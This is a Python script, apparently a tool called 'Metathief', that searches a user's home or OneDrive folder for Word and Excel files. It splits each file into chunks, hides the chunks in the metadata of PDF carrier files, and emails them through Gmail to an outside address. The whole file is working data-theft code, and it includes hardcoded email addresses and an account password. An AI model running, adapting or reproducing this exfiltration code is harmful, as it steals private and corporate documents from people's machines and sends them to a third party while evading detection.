# Modulos que necesito
import platform
import getpass
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from PyPDF2 import PdfFileReader, PdfFileWriter
from fpdf import FPDF

# Detectar SO donde esta
def detect():
    pathuser = []
    if platform.system() == "Linux":
        pathuser.append("Linux")
        pathuser.append("/home/" + getpass.getuser())
    elif platform.system() == "Windows":
        pathuser.append("Windows")
        pathuser.append("C:/Users/" + getpass.getuser() + "\\OneDrive")
    return pathuser


# Permite buscar archivos, para Linux por la cabecera y en Windows con la extensión
def search(tipo):
    pathuser = detect()
    lista = []
    log = len(tipo)
    for ruta, direc, files in os.walk(pathuser[1], topdown=True):
        if pathuser[0] == "Linux":
            for det in files:
                vict = ruta + os.sep + det
                if os.access(vict, os.R_OK) and os.path.isfile(vict):
                    f = open(vict, "rb")
                    b = f.read(log)
                    if b == tipo:
                        lista.append(vict)
        elif pathuser[0] == "Windows":
            if tipo[0] == 80:
                ext = "xlsx"
                doc = "docx"
            else:
                ext = "pdf"
                doc = "pdf"
            for det in files:
                if det.endswith('.' + ext) or det.endswith('.' + doc):
                    vict = ruta + os.sep + det
                    f = open(vict, "rb")
                    b = f.read(log)
                    if b == tipo:
                        lista.append(vict)
    return lista


# Calculo de cantidad de paquetes en que se va dividir cada archvio a extraer
def pack(fileExtract):
    thieffile = os.path.getsize(fileExtract)
    cant = thieffile // 307200
    cant = cant + 1
    return cant


# Carga del paquete en el portador
def writeMeta(cont, exfilt, cant, doc, carrier):
    pdfFile = PdfFileReader(open(carrier, 'rb'))
    writer = PdfFileWriter()
    writer.appendPagesFromReader(pdfFile)
    metadata = pdfFile.getDocumentInfo()
    writer.addMetadata(metadata)
    # Escribo la metadata:
    writer.addMetadata({
        '/Comment': exfilt
    })
    # Creo el archivo a enviar
    usr = getpass.getuser()
    exfilter = str(doc) + "-th-" + str(usr) + "-ie-" + str(cant) + "-f-" + str(cont) + ".pdf"
    fout = open(exfilter, 'wb')
    writer.write(fout)
    return fout


# Genera lista de portadores
def portadoras(pdfs):
    porta = []
    for pdf in pdfs:
        size = os.path.getsize(pdf)
        if size < 1024000:
            porta.append(pdf)
    if len(porta) != 0 :
        return porta
    else:
        pdfcreate = open("Document.pdf", 'wb')
        creado = PdfFileWriter()
        creado.insertBlankPage(width=35, height=50, index=1)
        creado.write(pdfcreate)
        porta.append(os.getcwd() + "\Document.pdf")
        return porta


# Envio por correo
def sender(exfilter, doc, tfiles):
    fromaddr = "tyrionpiraquibe@gmail.com"
    # Colocar una cuenta valida para envio
    toaddr = "dsespitia@gmail.com"
    # Colocar destino de los archivos filtrados
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Metathief send file " + str(doc) + " of " + str(tfiles)
    body = "The system control were not effective, Metathief succeeds filtering your corporate secrets"
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(exfilter, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % exfilter)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "TyPi_faK3")
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


def main():
    tipo = b'%PDF-1.7'
    pdfs = search(tipo)
    carriers = portadoras(pdfs)
    head = b'\x50\x4B\x03\x04\x14'
    files = search(head)
    tfiles = len(files)
    usr = getpass.getuser()
    doc = 1
    ncarr = 0
    for fileExtract in files:
        cant = pack(fileExtract)
        cont = 0
        while cont < cant:
            inic = 307200 * cont
            if cant != 1:
                stolenfile = open(fileExtract, 'rb')
                stolenfile.seek(inic)
                exfilt = stolenfile.read(307200)
            else:
                stolenfile = open(fileExtract, 'rb')
                thieffile = os.path.getsize(fileExtract)
                exfilt = stolenfile.read(thieffile)

            carrier = carriers[ncarr]
            writeMeta(cont, exfilt, cant, doc, carrier)
            exfilter = str(doc) + "-th-" + str(usr) + "-ie-" + str(cant) + "-f-" + str(cont) + ".pdf"
            sender(exfilter, doc, tfiles)
            os.remove(exfilter)
            cont = cont + 1
        if len(files) > doc and doc < len(carriers):
            doc = doc + 1
            ncarr = ncarr + 1
        else:
            doc = doc + 1
            ncarr = 0
    if os.path.isfile((os.getcwd() + "\Document.pdf")):
        os.remove(os.getcwd() + "\Document.pdf")


if __name__ == '__main__':
    main()
